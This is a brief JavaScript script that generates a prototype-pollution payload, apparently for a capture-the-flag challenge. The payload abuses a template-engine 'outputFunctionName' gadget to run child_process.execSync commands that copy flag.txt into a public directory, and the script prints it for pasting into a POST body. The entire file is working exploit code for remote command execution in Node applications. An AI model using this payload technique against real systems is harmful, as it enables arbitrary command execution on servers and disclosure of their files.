
// Payload Generator for Windows/Linux compatibility
const payload = {
    "theme": "dark",
    "__proto__": {
        "outputFunctionName": "x;try{global.process.mainModule.require('child_process').execSync('copy /Y flag.txt public\\\\pwned.txt')}catch(e){global.process.mainModule.require('child_process').execSync('cp flag.txt public/pwned.txt')};x"
    }
};

console.log('Copy this JSON payload for the POST body:');
console.log(JSON.stringify(payload, null, 2));
